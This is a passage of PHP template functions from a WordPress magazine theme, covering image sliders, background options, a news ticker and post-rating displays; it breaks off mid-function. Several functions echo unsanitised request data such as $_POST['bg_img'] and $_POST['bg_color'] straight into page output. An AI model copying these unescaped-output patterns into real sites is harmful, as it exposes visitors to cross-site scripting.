                            $path = $xmlObject->gallery[$i]->path;
                            $title = $xmlObject->gallery[$i]->title;
                            $description = $xmlObject->gallery[$i]->description;
                            $use_image_as = $xmlObject->gallery[$i]->use_image_as;
                            $video_code = $xmlObject->gallery[$i]->video_code;
                            $link_url = $xmlObject->gallery[$i]->link_url;
                            $image_url = px_attachment_image_src($path, 150, 150);
                            $image_url_full = px_attachment_image_src($path, 0, 0);
                            ?>
                            <article>
                                <a <?php if($use_image_as==2){?>href="<?php echo $link_url;?>" 
                                target="<?php if($use_image_as==2) { echo '_blank'; } else {echo '_self'; }?>" <?php }?>>
                                <?php  echo "<img src='".$image_url."' alt='".$title."' />"; ?>
                                </a>
                            </article>
                            <?php
                        }
                    } else {
                      echo '<h4 class="pix-heading-color">'.__( 'No results found.', 'Media News' ).'</h4>';
                    }
                ?>
               	
        	</div>
         	
                
           <?php } ?>     
        </div>
    </div>
  <?php }  
	}
}


// Flexslider function

if ( ! function_exists( 'px_flex_slider' ) ) {

	function px_flex_slider($width,$height,$slider_id, $single_slider = ''){

		global $px_node,$px_theme_option,$px_counter_node;
		

		$px_counter_node++;

		if($slider_id == ''){

			$slider_id = $px_node->slider;

		}


			$px_meta_slider_options = get_post_meta($slider_id, "px_meta_gallery_options", true); 

		?>

		<!-- Flex Slider -->





		  <div class="flexslider">
			  <ul class="slides">
				<?php 
					$px_counter = 1;

					$px_xmlObject_flex = new SimpleXMLElement($px_meta_slider_options);
					echo '';
					$gallery_count = $px_xmlObject_flex->gallery;
					foreach ( $px_xmlObject_flex->children() as $as_node ){
 						$image_url = px_attachment_image_src($as_node->path,$width,$height); 
						if(isset($as_node->link) && $as_node->link <> ''){$link = $as_node->link;} else {$link = '';}
						?>
                        <li>
                            <figure>
                                <img src="<?php echo $image_url ?>" alt="">   
                                    <?php if($as_node->title <> '' || $as_node->description <> ''){?>
                                        <div class="caption">
                                            <?php if($as_node->title <> ''){?><h2 class="cs-bgcolr"><a <?php if(isset($as_node->link) && $as_node->link <> ''){?>href="<?php echo $as_node->link;?>" target="<?php echo $as_node->link_target;?>" <?php }?>><?php echo $as_node->title;?></a></h2><?php }?>
                                            <?php if($as_node->description <> ''){?>
                                                <p><?php echo $as_node->description;?></p>
                                              <?php }?>
                                        </div>
									<?php }?>
                                
                            </figure>
                        </li>
					<?php 
					$px_counter++;
					}
				?>
                
			  </ul>
             
		  </div>
		<?php px_enqueue_flexslider_script(); ?>
		<!-- Slider height and width -->

		<!-- Flex Slider Javascript Files -->

		<script type="text/javascript">
			jQuery(document).ready(function($) {
				<?php if(isset($single_slider) && $single_slider == 'single'){?>
					px_flexsliderGallery();
				<?php } else {?>
					px_flexsliderBannerGallery(); 
				<?php } ?>
			});
		</script>

	<?php

	}

}


// CycleSlider function

if ( ! function_exists( 'px_cycle_slider' ) ) {

	function px_cycle_slider($width,$height,$slider_id){
		 $px_meta_slider_options = get_post_meta($slider_id, "px_meta_gallery_options", true);
			?>
            <script type="text/javascript">
				jQuery(document).ready(function($) {
					jQuery('#slideshow').cycle({
						fx:       'fade',
						timeout:   2000,
						after:     onAfter
					});
				});
				
				function onAfter(curr,next,opts) {
					var caption = 'Image ' + (opts.currSlide + 1) + ' of ' + opts.slideCount;
					jQuery('#caption').html(caption);
				}
			</script>
		<div class="teamdetail-carousel"> 
         <div class="center">
                <span class="cycle-prev" id="cycle-next<?php echo $slider_id;?>"><i class="fa fa-chevron-left"></i></span>
                <span class="cycle-next" id="cycle-prev<?php echo $slider_id;?>"><i class="fa fa-chevron-right"></i></span>
            </div>
             <div id="slideshow" class="cycle-slideshow"
                data-cycle-fx=carousel
                data-cycle-next="#cycle-next<?php echo $slider_id;?>"
                data-cycle-prev="#cycle-prev<?php echo $slider_id;?>"
                data-cycle-slides=">figure"
                data-cycle-timeout=0>
						<?php 
                        $px_counter = 1;
                        $px_xmlObject_flex = new SimpleXMLElement($px_meta_slider_options);
                        
                        foreach ( $px_xmlObject_flex->children() as $as_node )
                        {
                            $image_url = px_attachment_image_src($as_node->path,$width,$height); 
                            if(isset($as_node->link) && $as_node->link <> ''){$link = $as_node->link;} else {$link = '';}
                       		 ?>
                        <figure>
                        <img src="<?php echo $image_url ?>" alt="">   
                        <?php if($as_node->title <> ''){?>
                            <figcaption>
                                <i class="fa fa-camera"></i><h2 class="cs-bgcolr"><a <?php if(isset($as_node->link) && $as_node->link <> ''){?>href="<?php echo $as_node->link;?>" target="<?php echo $as_node->link_target;?>" <?php }?>><?php echo $as_node->title;?></a></h2>
                            </figcaption><?php }?>
                        </figure>
                                
                        <?php 
                            $px_counter++;
                        }
                        ?>
                </div>
                <p id="caption"></p>
			</div>
		<?php
		}

}

if ( ! function_exists( 'px_page_title' ) ) {	
	function px_page_title(){
		if(function_exists("is_shop") and is_shop()){
			$px_shop_id = woocommerce_get_page_id( 'shop' );
			echo "<div class=\"subtitle\"><h1 class=\"cs-page-title\">".get_the_title($px_shop_id)."</h1></div>";
		}else if(function_exists("is_shop") and !is_shop()){
				get_subheader_title();
		}else if(function_exists( 'is_bbpress' ) && is_bbpress()){
				get_subheader_title();
		}else{
				get_subheader_title();
		}                        	
	}
}


	if ( ! function_exists( 'px_bg_image' ) ) {	
	// Get Main background
		function px_bg_image(){
	
		global $px_theme_option;
	
		$bg_img = '';
		
		
		if ( isset($_POST['bg_img']) ) {
	
			$_SESSION['mnsess_bg_img'] = $_POST['bg_img'];
	
			echo $bg_img = get_template_directory_uri()."/images/background/bg".$_SESSION['mnsess_bg_img'].".png";
	
		}
	
		else if ( isset($_SESSION['mnsess_bg_img']) and !empty($_SESSION['mnsess_bg_img'])){
	
			$bg_img = get_template_directory_uri()."/images/background/bg".$_SESSION['mnsess_bg_img'].".png";
	
		}
	
		else {
	
			if (isset($px_theme_option['bg_img_custom']) and $px_theme_option['bg_img_custom'] == "" ) {
	
				if (isset($px_theme_option['bg_img']) and $px_theme_option['bg_img'] <> 0 ){
	
					$bg_img = get_template_directory_uri()."/images/background/bg".$px_theme_option['bg_img'].".png";
	
				}
	
			}
	
			else  { 
	
				if(isset($px_theme_option['bg_img_custom']))
					$bg_img = $px_theme_option['bg_img_custom'];
	
			}
	
		}
	
		if ( $bg_img <> "" ) {
	
			echo ' style="background:url('.$bg_img.') ' . $px_theme_option['bg_repeat'] . ' top  ' . $px_theme_option['bg_position'] . ' 		' . $px_theme_option['bg_attach'].'"';
	
		}
	
	}
	}
	// Get Background color Pattren
	if ( ! function_exists( 'px_bgcolor_pattern' ) ) {	
		function px_bgcolor_pattern(){
	
		global $px_theme_option;
	
		// pattern start
		
		$pattern = '';
	
		$bg_color = '';
	
		if ( isset($_POST['custome_pattern']) ) {
	
			$_SESSION['mnsess_custome_pattern'] = $_POST['custome_pattern'];
	
			$pattern = get_template_directory_uri()."/images/pattern/pattern".$_SESSION['mnsess_custome_pattern'].".png";
	
		}
	
		else if ( isset($_SESSION['mnsess_custome_pattern']) and !empty($_SESSION['mnsess_custome_pattern'])){
	
			$pattern = get_template_directory_uri()."/images/pattern/pattern".$_SESSION['mnsess_custome_pattern'].".png";
	
		}
	
		else {
	
			if (isset($px_theme_option['custome_pattern']) and $px_theme_option['custome_pattern'] == "" ) {
	
				if (isset($px_theme_option['pattern_img']) and $px_theme_option['pattern_img'] <> 0 ){
	
					$pattern = get_template_directory_uri()."/images/pattern/pattern".$px_theme_option['pattern_img'].".png";
	
				}
	
			}
	
			else { 
				if ( isset($px_theme_option['custome_pattern']) )
					$pattern = $px_theme_option['custome_pattern'];
	
			}
	
		}
	
		// pattern end
	
		// bg color start
	
		if ( isset($_POST['bg_color']) ) {
	
			$_SESSION['mnsess_bg_color'] = $_POST['bg_color'];
	
			$bg_color = $_SESSION['mnsess_bg_color'];
	
		}
	
		else if ( isset($_SESSION['mnsess_bg_color']) ){
	
			$bg_color = $_SESSION['mnsess_bg_color'];
	
		}
	
		else {
			if ( isset($px_theme_option['bg_color']) )
				$bg_color = $px_theme_option['bg_color'];
	
		}
	
		// bg color end
		if($bg_color <> '' or $pattern <> ''){
			echo ' style="background:'.$bg_color.' url('.$pattern.')" ';
		}
	
	}
	}

	if ( ! function_exists( 'px_no_result_found' ) ) {	
		function px_no_result_found(){
			 _e("No results found.",'Medianews');
		}
	}

// news announcement 
if ( ! function_exists( 'px_announcement' ) ) {
	function px_announcement(){
	?>
	<div class="outer-newsticker">
    
        <?php 
        global $px_theme_option;
        $blog_category = $px_theme_option['announcement_blog_category'];
        $announcement_no_posts = $px_theme_option['announcement_no_posts'];
         if(isset($blog_category) && $blog_category <> '0'){
            if (empty($announcement_no_posts)){ $announcement_no_posts  = 5;}
            $args = array('posts_per_page' => "$announcement_no_posts", 'category_name' => "$blog_category",'post_status' => 'publish');
            $custom_query = new WP_Query($args);
            ?>
            <div class="announcement-ticker">
                <?php if(isset($px_theme_option['announcement_title']) && $px_theme_option['announcement_title'] <> ''){?><h2><?php echo $px_theme_option['announcement_title'];?></h2><?php }?>
                <?php 
					if($custom_query->have_posts()):
					px_enqueue_newsticker();
				?>
                <script>
                	jQuery(document).ready(function(){
                	    px_jsnewsticker('cls-news-ticker',50,80)
                	});
            	</script>
                <div class="ticker-wrapp">
                    <ul class="cls-news-ticker">
                      <?php 
                          while ($custom_query->have_posts()) : $custom_query->the_post();
                      ?>
                          <li>															
                              <a href="<?php the_permalink();?>"><?php the_title();?> &nbsp; <?php 
							  the_date( get_option('date_format'), '', '', true); 
							  //echo date_i18n(get_option('date_format'),strtotime(get_the_date()));
							  
							  ?></a>
                          </li>
                         <?php endwhile;?>
                    </ul>
                </div>
                <?php else: 
                   px_no_result_found(false);
                  endif;
				 wp_reset_postdata(); ?>
            </div>
        <?php }?>
        </div>
	<?php	
	}
}
// rating function
if ( ! function_exists( 'px_user_rating' ) ) {	
	function px_user_rating(){
		global $post;
		$user_rating = 0;
		$rating_vote_counter = get_post_meta($post->ID, "rating_vote_counter", true);
		$rating_value = get_post_meta($post->ID, "rating_value", true);
		if ( $rating_value <> 0 and $rating_vote_counter <> 0 ) {
			$user_rating =  ( $rating_value / $rating_vote_counter  ) ;
		}
		if($user_rating<0){
			$user_rating = 0;
		}
		
		return round($user_rating, 1);;
	}
}

// review criteria check
if ( ! function_exists( 'px_criteria_check' ) ) {	
	function px_criteria_check($value) {
		global $px_theme_option;
		$html = '';
		for ( $j = 1; $j <= 10; $j++ ) {
			if ( $value >= $px_theme_option['review_criteria_'.$j.'_1'] and $value <= $px_theme_option['review_criteria_'.$j.'_2'] ) {
				$html = $px_theme_option['review_criteria_text_'.$j.''];
			}
		}
		return $html;
	}
}
if ( ! function_exists( 'px_rating_section' ) ) {	
	function px_rating_section($px_xmlObject){
	 global $post,$px_theme_option;
	 $var_pb_review_section_position = '';
		if(isset($px_xmlObject->var_pb_review_section_position) && $px_xmlObject->var_pb_review_section_position == 'bottom'){
			$var_pb_review_section_position='medium-review';
		} else {
			$var_pb_review_section_position=$px_xmlObject->var_pb_review_section_position;
		}
		$summry_class = '';
		if((isset($px_xmlObject->var_pb_post_review) && $px_xmlObject->var_pb_post_review == 'on') || (isset($px_xmlObject->var_pb_post_advertisement) && $px_xmlObject->var_pb_post_advertisement <> '')) {
			?>
			<div class="px-review-section <?php echo $var_pb_review_section_position;?>">
			<?php
		
				if(isset($px_xmlObject->var_pb_post_review) && $px_xmlObject->var_pb_post_review == 'on') {
					if(isset($px_xmlObject->var_pb_review_section_position) && $px_xmlObject->var_pb_review_section_position <> '') {
						if(!isset($px_xmlObject->var_pb_review_summery) || $px_xmlObject->var_pb_review_summery == ''){$summry_class = 'no-summary';}
						?>
								   <?php if($px_xmlObject->var_pb_review_section_title <> '' && isset($px_xmlObject->var_pb_review_title_position) && $px_xmlObject->var_pb_review_title_position == 'outside') {?>
											<header class="pix-heading-title">
												<h2 class="pix-section-title"><?php echo $px_xmlObject->var_pb_review_section_title; ?></h2>
											</header>
									<?php }?>
									<!-- Blog Rating Section Start -->
									  <div class="blog-rating-sec <?php echo $summry_class;?>">
										<figure>
										  <figcaption>
											<?php
												echo px_user_box_rating_display();
												$rating_value = get_post_meta($post->ID, "rating_value", true);
												if($rating_value == ''){
												 $rating_value = 0;
												}
											 ?>
											 <div class="stars">
												<script type="text/javascript">
													  jQuery(document).ready(function(){
															jQuery(".basic ").jRating({
																	bigStarsPath : '<?php echo get_template_directory_uri(); ?>/images/stars.png', // path of the icon stars.png
																	smallStarsPath : '<?php echo get_template_directory_uri(); ?>/images/small.png', // path of the icon small.png
																	phpPath : '<?php echo get_template_directory_uri(); ?>/include/review_save.php?id=<?php echo $post->ID?>', // path of the php file jRating.php
																	rateMax : 10,
																	length : 5
															});
													  });
												</script>
													<div class="rating-desc">
														<div class="rating-inn">
														
														<?php px_enqueue_rating_style_script();?>
															<div id="rating_saved">
																<strong><?php if($px_theme_option["trans_switcher"] == "on") { _e("User Rating",'Media News'); }else{  echo $px_theme_option["trans_user_rating"];}?>: </strong>
																<div class="heading-color">
																	<?php 
																	
																	echo $userrating = px_user_rating();
																	if ( get_post_meta($post->ID, "rating_vote_counter", true) > 0 ) {
																		$rating_vote_counter = get_post_meta($post->ID, "rating_vote_counter", true);
																	}
																	else {
																		$rating_vote_counter = 0;
																	}
																	echo " ( " . $rating_vote_counter . " Votes )";
																	?>
																</div>
															</div>
														<div id="rating_loading" style="display:none"><i class='fa fa-spinner fa-spin fa-1x'></i></div>
														<div class="px-star-rating basic <?php if ( isset($_COOKIE["rating_vote_counter".$post->ID ]) ){echo "jDisabled"; }?>" data="<?php echo $userrating;?>"><span style="width:<?php echo $userrating;?>%"></span></div>
														
														</div>
													</div>
												  </div>
										  </figcaption>
										</figure>
									 <?php if(isset($px_xmlObject->var_pb_review_summery) && $px_xmlObject->var_pb_review_summery <> '' || isset($px_xmlObject->reviews)){?>
										<div class="text">
										<?php if($px_xmlObject->var_pb_review_section_title <> '' && isset($px_xmlObject->var_pb_review_title_position) && $px_xmlObject->var_pb_review_title_position == 'inside') {?>
											<header class="pix-heading-title">
												<h2 class="pix-section-title"><?php echo $px_xmlObject->var_pb_review_section_title; ?></h2>
											</header>
										<?php }?>
									   <?php if(isset($px_xmlObject->reviews)) {?>
											
											<script type="text/javascript">
											jQuery(document).ready(function(){
												px_skills_shortcode_script();
												jQuery("[data-loadbar]").each(function(index){
													var d =jQuery(this) .attr('data-loadbar');
													jQuery(this).css({'color':'yellow'});
												});
											});
											</script>
											<div class="skills">
												<div class="progress_bar">
												<?php foreach($px_xmlObject->reviews as $reviews){ $color_value = cs_criteria_color_check($reviews->var_pb_review_points);?>
													<div data-loadbar-text="<?php echo $reviews->var_pb_review_points;?>%" data-loadbar="<?php if($reviews->var_pb_review_points>10 || !is_int($reviews->var_pb_review_points)){echo $reviews->var_pb_review_points;} else {echo round($reviews->var_pb_review_points*10);}?>" class="tiny-green">
														<?php if($reviews->var_pb_review_title <> ''){?><p><?php echo $reviews->var_pb_review_title;?></p><?php }?>
														<div style="background-color: <?php echo $color_value;?>;"></div>
														<?php if($reviews->var_pb_review_points <> ''){?><span class="infotxt"><?php if($reviews->var_pb_review_points>10 || !is_int($reviews->var_pb_review_points)){echo $reviews->var_pb_review_points;} else {echo round($reviews->var_pb_review_points*10);}?></span><?php }?>
													</div>
													<?php }?>
												</div>
											</div>
										<?php }?>
									  <?php if(isset($px_xmlObject->var_pb_review_summery) && $px_xmlObject->var_pb_review_summery <> ''){?>
											 <div class="review-summary">
												<?php echo $px_xmlObject->var_pb_review_summery;?>
											</div>
										<?php }?>
									  </div>
									  <?php }?>
									  <!--  Rating Section End -->
							</div>
						<?php	
					}
				}
				if(isset($px_xmlObject->var_pb_post_advertisement) && $px_xmlObject->var_pb_post_advertisement <> '') {
					 echo do_shortcode(html_entity_decode($px_xmlObject->var_pb_post_advertisement));
				 }
				?>
		 </div>
		<?php	
		}
	}
}
	
// random String
if ( ! function_exists( 'px_generate_random_string' ) ) {
	function px_generate_random_string($length = 3) {
		$characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
		$randomString = '';
		for ($i = 0; $i < $length; $i++) {
			$randomString .= $characters[rand(0, strlen($characters) - 1)];
		}
		return $randomString;
	}
}


// review criteria check
if ( ! function_exists( 'cs_criteria_color_check' ) ) {
	function cs_criteria_color_check($value) {
		global $px_theme_option;
		$html = '';
		for ( $j = 1; $j <= 10; $j++ ) {
			if(isset($px_theme_option['review_criteria_'.$j.'_1']) && $px_theme_option['review_criteria_'.$j.'_1'] <> ''){
				if ( $value >= $px_theme_option['review_criteria_'.$j.'_1'] and $value <= $px_theme_option['review_criteria_'.$j.'_2'] ) {
					$html = $px_theme_option['review_criteria_text_color_'.$j.''];
				}
			}
		}
		return $html;
	}
}
// Box rating
if ( ! function_exists( 'px_user_box_rating_display' ) ) {
	function px_user_box_rating_display($counter_id='',$radius='25'){
		global $post;
		$user_rating = px_user_rating();
		if(isset($user_rating) && $user_rating >0){
			$user_rating_percentage = $user_rating*10;
			$color = cs_criteria_color_check($user_rating_percentage);
			if(isset($color) && $color == ''){
				$color = '#215e1d';
			}
			$rating_criteria = px_criteria_check($user_rating_percentage);
			$html = '';
			$html .= '<div class="point-rating">
				<div class="point-inn">
			  <big>'.$user_rating.'</big>';
			  if(isset($rating_criteria) && !empty($rating_criteria)){
				$html .= ' <span class="avrage-btn" style=" background-color:'.$color.'">'.$rating_criteria.'</span>';
			  }
			 $html .= '</div>
			</div>';
			return $html;
		}
	}
}

// Circle rating
if ( ! function_exists( 'px_user_rating_display' ) ) {
	function px_user_rating_display($counter_id='',$radius='25'){
		global $post;
		
		$user_rating = px_user_rating();
		if(isset($user_rating) && $user_rating >0){
			px_enqueue_circular_progress();
			$user_rating_percentage = $user_rating*10;
			$color = cs_criteria_color_check($user_rating_percentage);
			if(isset($color) && $color == ''){
				$color = '#215e1d';
			}
			$html = '';
			$html .= '<script>
						 jQuery(document).ready(function($){
							 skill_shortcode("'.$user_rating.'","'.$post->ID.$counter_id.'","'.$user_rating_percentage.'","'.$color.'", "'.$radius.'");
						});
					</script>';
			
			$html .= '<div class="circular-progressbar skill-v2" id="cirlce'.$post->ID.$counter_id.'"></div>';
			return $html;
		}
	}
}

// Horizantal rating
if ( ! function_exists( 'px_user_rating_horziantal_display' ) ) {
	function px_user_rating_horziantal_display(){
		global $post;
		$html = '';
		$user_rating = px_user_rating();
		if(isset($user_rating) && $user_rating >0){
			$user_rating_percentage = $user_rating*10;
			$color = cs_criteria_color_check($user_rating_percentage);
			if(isset($color) && $color == ''){
				$color = '#215e1d';
			}
			$html .= '<div class="rating-v1 star-img" style="background-color:'.$color.';"><i class="fa fa-star"></i>'.$user_rating.'</div>';
		}
		return $html;
		
	}
}
// Excerpt Length
if ( ! function_exists( 'px_excerpt_length' ) ) {
	function px_excerpt_length( $length ) {
		global $px_theme_option;
		if(!isset($px_theme_option['default_excerpt_length'])){
			$default_excerpt_length = '255';
		} else {
			if(isset($px_theme_option['default_excerpt_length']) && $px_theme_option['default_excerpt_length'] <> ''){ $default_excerpt_length = $px_theme_option['default_excerpt_length']; }else{ $default_excerpt_length = '255';}
		}
		return $default_excerpt_length;
	}
	add_filter( 'excerpt_length', 'px_excerpt_length' );
}
if ( ! function_exists( 'px_excerpt_more' ) ) {
	function px_excerpt_more($more) {
		   global $post, $px_theme_option;
		   if(!isset($px_theme_option['trans_read_more'])){
				$readmore = __('READ MORE','Media News');
			} else {
				if(isset($px_theme_option["trans_switcher"]) && $px_theme_option["trans_switcher"] == "on") { $readmore = __('READ MORE','Media News'); }elseif(isset($px_theme_option["trans_read_more"])){  $readmore = $px_theme_option["trans_read_more"];}
			}
		return '<a href="'.get_permalink().'" class="btnreadmore btn pix-bgcolrhvr">'.$readmore.'</a>';
	}
	add_filter('excerpt_more', 'px_excerpt_more');
}

if ( ! function_exists( 'px_home_slider' ) ) {
	function px_home_slider(){
	global $px_theme_option;
		$slider_type = '';
		$slider_name = '';
		$slider_id = '';
		$slider_blog_category = '';
		$slider_no_posts = '';
	 if(function_exists("is_shop") and is_shop()){
		$px_shop_id = woocommerce_get_page_id( 'shop' );
		$px_xmlObject = px_meta_shop_page('px_page_builder',$px_shop_id);
		if (!empty($px_xmlObject)) {
				if ( empty($px_xmlObject->slider_type) ) $slider_type = ""; else $slider_type = $px_xmlObject->slider_type;
				if ( empty($px_xmlObject->slider_name) ) $slider_name = ""; else $slider_name = $px_xmlObject->slider_name;
				if ( empty($px_xmlObject->slider_id) ) $slider_id = ""; else $slider_id = $px_xmlObject->slider_id;
				if ( empty($px_xmlObject->slider_blog_category) ) $slider_blog_category = ""; else $slider_blog_category = $px_xmlObject->slider_blog_category;
				if ( empty($px_xmlObject->slider_no_posts) ) $slider_no_posts = ""; else $slider_no_posts = $px_xmlObject->slider_no_posts;
		 }
	}else if(function_exists( 'is_bbpress' ) && is_bbpress()){
		   $px_xmlObject = px_meta_page('px_page_builder');
		   if (!empty($px_xmlObject)) {
				if ( empty($px_xmlObject->slider_type) ) $slider_type = ""; else $slider_type = $px_xmlObject->slider_type;
				if ( empty($px_xmlObject->slider_name) ) $slider_name = ""; else $slider_name = $px_xmlObject->slider_name;
				if ( empty($px_xmlObject->slider_id) ) $slider_id = ""; else $slider_id = $px_xmlObject->slider_id;
				if ( empty($px_xmlObject->slider_blog_category) ) $slider_blog_category = ""; else $slider_blog_category = $px_xmlObject->slider_blog_category;
				if ( empty($px_xmlObject->slider_no_posts) ) $slider_no_posts = ""; else $slider_no_posts = $px_xmlObject->slider_no_posts;
		   }
	}else if(is_page()){
		   $px_xmlObject = px_meta_page('px_page_builder');
		   if (!empty($px_xmlObject)) {
				if ( empty($px_xmlObject->slider_type) ) $slider_type = ""; else $slider_type = $px_xmlObject->slider_type;
				if ( empty($px_xmlObject->slider_name) ) $slider_name = ""; else $slider_name = $px_xmlObject->slider_name;
				if ( empty($px_xmlObject->slider_id) ) $slider_id = ""; else $slider_id = $px_xmlObject->slider_id;
				if ( empty($px_xmlObject->slider_blog_category) ) $slider_blog_category = ""; else $slider_blog_category = $px_xmlObject->slider_blog_category;
				if ( empty($px_xmlObject->slider_no_posts) ) $slider_no_posts = ""; else $slider_no_posts = $px_xmlObject->slider_no_posts;
		   }
	  }
	  if($slider_type =='default_slider') {
		  if ( empty($px_theme_option['slider_type']) ) $slider_type = ""; else $slider_type = $px_theme_option['slider_type'];
		  if ( empty($px_theme_option['slider_name']) ) $slider_name = ""; else $slider_name = $px_theme_option['slider_name'];
		  if ( empty($px_theme_option['slider_id']) ) $slider_id = ""; else $slider_id = $px_theme_option['slider_id'];
		  if ( empty($px_theme_option['slider_blog_category']) ) $slider_blog_category = ""; else $slider_blog_category = $px_theme_option['slider_blog_category'];
		  if ( empty($px_theme_option['slider_no_posts']) ) $slider_no_posts = ""; else $slider_no_posts = $px_theme_option['slider_no_posts'];
	  }
	 if(isset($slider_type) && $slider_type <> ''){
		echo '<div class="col-md-12">';
			if(isset($slider_type) && $slider_type <> '' && $slider_type == 'post_slider'){
			if(isset($slider_blog_category)){ $slider_category = $slider_blog_category; }else{ $slider_blog_category =''; }
			if($slider_blog_category <> ''){
				if(isset($slider_no_posts)){ $slider_no_posts = $slider_no_posts; }else{ $slider_no_posts=1; }
				$args = array('posts_per_page' => "$slider_no_posts", 'post_status' => 'publish');
				if(isset($slider_blog_category) && $slider_blog_category <> '' && $slider_blog_category <> '0'){
					$blog_category_array = array('category_name' => "$slider_blog_category");
					$args = array_merge($args, $blog_category_array);
				}
				$custom_query = new WP_Query($args);
				if($custom_query->have_posts()):
				px_enqueue_nicescroll();
		?>
				<div id="banner" class="blog-carousel-v2">
			 
						<script>
						
							jQuery(document).ready(
							function() {  
							  jQuery(".blog-carousel-v2 .sliderpagination").niceScroll({
								cursorwidth : 10,
								cursorcolor :"#616161",
								autohidemode:false,
								cursorborder : '2px solid #131313',
								railoffset:true,
								cursorborderradius : 0,
								background: "#161616"
							  });
							});
							</script>
						<?php
						$slider_pagination = array();
							echo '<div class="cycle-slideshow" 
								data-cycle-fx=fade
								data-cycle-timeout=3000
								data-cycle-auto-height=container
								data-cycle-slides="article"
								
								data-cycle-random=false
								data-cycle-pager="#home-banner-pager"
								data-cycle-pager-template="">';
								$counter_slideshow=0;
							while ($custom_query->have_posts()) : $custom_query->the_post();
								$counter_slideshow++;
								$image_url_full = px_get_post_img_src($post->ID, '810' ,'410');
								if($image_url_full <> ''){
								$slider_pagination[] = get_the_title();
								?>
									<article class="<?php echo $post->ID; ?>">
										<?php if($image_url_full <> ''){?><img src="<?php echo $image_url_full;?>" alt=""><?php }?>
												
											   <div class="caption">
													<?php 
														$rating = px_user_rating_display('blog-carousel-v2'.$counter_slideshow);
														if(isset($rating) && $rating <> ''){
															?>
															<div class="heading-color cs-rating-heading">
																<?php  echo $rating;?>
															</div>
													<?php }?>
													<div class="text">
														<?php 
														$before_cat = '<span> ';
														$categories_list = get_the_term_list ( get_the_id(), 'category', $before_cat, ', ', '</span>' );
														if ( $categories_list ){
															printf( __( '%1$s', 'Media News'),$categories_list );
														}
														?>
														<h2><a href="<?php the_permalink(); ?>"><?php if ( strlen(get_the_title()) > 50){echo substr(get_the_title(),0,50);} else { the_title();} if ( strlen(get_the_title()) > 50) echo  "...";?></a></h2>
														<?php px_posted_on(false,false,true,true,false,false);?>
														
													</div>
											   </div> 
									</article>
								<?php
								}
							endwhile;
				echo '</div>';

				if(is_array($slider_pagination) && count($slider_pagination)>0){
					$pagination_no = 0;
					echo '<div class="sliderpagination">
						<ul id="home-banner-pager" class="banner-pager">';
							while ($custom_query->have_posts()) : $custom_query->the_post();
								$counter_slideshow++;
								$image_small_full = px_get_post_img_src($post->ID, '150' ,'150');
								if($image_small_full <> ''){
									echo '<li>
									<figure><img src="'.$image_small_full.'" alt=""></figure>';
										?>
										<div class="text">
										<h2><a href="<?php the_permalink(); ?>"><?php if ( strlen(get_the_title()) > 50){echo substr(get_the_title(),0,50);} else { the_title();} if ( strlen(get_the_title()) > 50) echo  "...";?></a></h2>
										<?php
										px_posted_on(false,false,true,true,true,false);
										?>
										</div>
										<?php
									echo '</li>';
								}
						endwhile;
						echo '</ul></div>';
				}
			px_enqueue_cycle_script();
		endif;
		wp_reset_postdata();
		?>
	 
				</div>
		<?php
			}
	}
			else if(isset($slider_type) && $slider_type <> '' && $slider_type == 'post_carousel'){
			if(isset($slider_blog_category)){ $slider_blog_category = $slider_blog_category; }else{ $slider_blog_category =''; }
		if($slider_blog_category <> ''){
			if(isset($slider_no_posts)){ $slider_no_posts = $slider_no_posts; }else{ $slider_no_posts=1; }
			$args = array('posts_per_page' => "$slider_no_posts", 'post_status' => 'publish');
			if(isset($slider_blog_category) && $slider_blog_category <> '' && $slider_blog_category <> '0'){
				$blog_category_array = array('category_name' => "$slider_blog_category");
				$args = array_merge($args, $blog_category_array);
			}
			$custom_query = new WP_Query($args);
			if($custom_query->have_posts()):
			?>
			<div id="banner" class="pix-blog blog-banner-carousel">
				<div class="center">
					<span class="cycle-prev" id="cycle-next"><i class="fa fa-angle-left"></i></span>
					<span class="cycle-next" id="cycle-prev"><i class="fa fa-angle-right"></i></span>
				</div>
			
			<?php
		$slider_pagination = array();
			echo '<div class="cycle-slideshow" 
				data-cycle-fx=carousel
				data-cycle-next="#cycle-next"
				data-cycle-prev="#cycle-prev"
				data-cycle-slides=">article"
				data-cycle-timeout=3000>';
				$counter_slideshow=0;
			while ($custom_query->have_posts()) : $custom_query->the_post();
				$counter_slideshow++;
				$blog_classes = array();
				$blog_classes[]= 'blog-grid-v2';
				$image_url_full = px_get_post_img_src($post->ID, '282' ,'405');
				if($image_url_full == ""){
					$blog_classes[] = 'no-image';
				}
							?>
				<article <?php post_class($blog_classes); ?>>
					<figure>
					<?php if($image_url_full <> ''){?><img src="<?php echo $image_url_full;?>" alt=""><?php }?>
					<figcaption>
						<div class="text">
						<ul class='post-options blog-medium-options'>
						<?php 
							$before_cat = "<li>";
							$categories_list = get_the_term_list ( get_the_id(), 'category', $before_cat, ', ', '</li>' );
							if ( $categories_list ){
								printf( __( '%1$s', 'Media News'),$categories_list );
							}
							if ( comments_open() ) {  
								echo "<li class='px-comments'>"; comments_popup_link( __( '0 Comment', 'Media News' ) , __( '1 Comment', 'Media News' ), __( '% Comments', 'Media News' ) ); 
							}
						?>
						</ul>
							
						  <h2 class="pix-post-title"><a href="<?php the_permalink(); ?>" ><?php the_title(); ?>.</a></h2>  
								<ul class="blog-options">
									<?php 
										$rating = px_user_rating_horziantal_display();
										if(isset($rating) && $rating <> ''){
										  echo '<li class="rating">'.$rating.'</li>';
										 }
									?>
									<li><time datetime="<?php echo date('Y-m-d',strtotime(get_the_date()));?>">
									<?php 
									the_date( get_option('date_format'), '', '', true); 
									//echo date_i18n(get_option('date_format'),strtotime(get_the_date()));
									?></time></li>
								
								</ul>
							   <div class="text-desc">
								 <?php 
									px_get_the_excerpt('255',false);
								   
								   ?>
							   </div>
							
						</div>
						</figcaption>
					</figure>
				</article>
					<?php
				endwhile;
				echo '</div>';
				px_enqueue_cycle_script();

				endif;
			wp_reset_postdata();
			?>
	 </div>
	<?php
	}
}
			else if(isset($slider_type) && $slider_type <> '' && $slider_type == 'post_slider2'){
				if(isset($slider_blog_category)){ $slider_blog_category = $slider_blog_category; }else{ $slider_blog_category =''; }
				if($slider_blog_category <> ''){
			$args = array('posts_per_page' => "4", 'post_status' => 'publish');
			if(isset($slider_blog_category) && $slider_blog_category <> '' && $slider_blog_category <> '0'){
				$blog_category_array = array('category_name' => "$slider_blog_category");
				$args = array_merge($args, $blog_category_array);
			}
			$custom_query = new WP_Query($args);
			if($custom_query->have_posts()):
			?>
			<div id="banner" class="pix-blog banner-view">
				   <?php
